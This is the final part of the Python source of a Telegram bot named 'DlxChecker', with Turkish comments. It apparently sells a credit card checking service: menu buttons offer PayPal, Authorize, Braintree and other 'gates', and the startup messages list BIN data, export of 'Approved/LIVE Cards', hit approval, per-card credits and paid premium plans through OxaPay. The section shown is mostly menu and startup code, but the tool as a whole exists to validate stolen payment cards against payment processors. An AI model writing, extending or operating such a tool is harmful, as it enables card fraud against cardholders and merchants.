            btn4 = types.InlineKeyboardButton("PayPal", callback_data="gate_paypal_1")
            btn5 = types.InlineKeyboardButton("authorize", callback_data="gate_payflow_1")
            btn6 = types.InlineKeyboardButton("Braintree", callback_data="gate_braintree_1")
            btn7 = types.InlineKeyboardButton("Other Gates", callback_data="gate_other")
            btn8 = types.InlineKeyboardButton("Auth Gates", callback_data="show_gates")
            btn9 = types.InlineKeyboardButton("Tools", callback_data="show_tools")
            btn10 = types.InlineKeyboardButton("TXT Commands", callback_data="show_txt_commands")
            btn11 = types.InlineKeyboardButton("Auto CMD", callback_data="show_auto_cmd")
            btn12 = types.InlineKeyboardButton("Premium", callback_data="back_to_plans")
            markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11, btn12)
            try:
                bot.edit_message_text(welcome_msg, call.message.chat.id, call.message.message_id, reply_markup=markup)
            except:
                bot.send_message(call.message.chat.id, welcome_msg, reply_markup=markup)
    except Exception as e:
        logger.error(f"Callback error: {e}")

# ============================================================================
# BUY KOMUTU
# ============================================================================
@bot.message_handler(commands=['buy'])
def cmd_buy(message):
    cmd_premium(message)


def main():
    print("=" * 50)
    print("🚀 DlxChecker Bot Starting...")
    print(f"🤖 Bot Token: {TOKEN[:10]}...")
    print(f"📊 BIN Records: {len(BIN_DATA)}")
    print(f"📢 Required Channels: {len(REQUIRED_CHANNELS)}")
    print("✅ Credit System Active!")
    print("✅ Daily 50 Credits System Active!")
    print("✅ Redeem Code System Active!")
    print("✅ OxaPay Integration Ready - GERÇEK ÖDEME KONTROLÜ")
    print("✅ Ban System Active!")
    print("✅ Log System Active - LOG NET CHANNEL AKTİF!")
    print("✅ Hit Approval System Active!")
    print("✅ Broadcast System Active! (/messagehere)")
    print("✅ Approved/LIVE Cards TXT Export Active!")
    print("✅ Admin: Unlimited Credits")
    print("✅ Thread Pool: 50 workers")
    print("✅ Bot Threads: 100 (telebot threaded)")
    print("✅ /userinfo Command Added - Kullanıcı detayları")
    print("✅ Response Formatting - Sadece Adyen tabanlı gate'lerde 'Your card was declined'")
    print("✅ Single Card Output - Başarılı kartlar tek tek gönderiliyor")
    print("✅ TXT Credit Deduction - Her kart için kredi kesiliyor")
    print("✅ Multi-threaded - Her kullanıcı kendi thread'inde, bot asla kasmıyor")
    print("=" * 50)
    
    load_bin_data()
    
    def signal_handler(sig, frame):
        print("\n🛑 Shutting down gracefully...")
        thread_pool.shutdown(wait=True)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        bot.infinity_polling()
    except Exception as e:
        logger.error(f"Bot error: {e}")
        thread_pool.shutdown(wait=True)

if __name__ == "__main__":
    main()
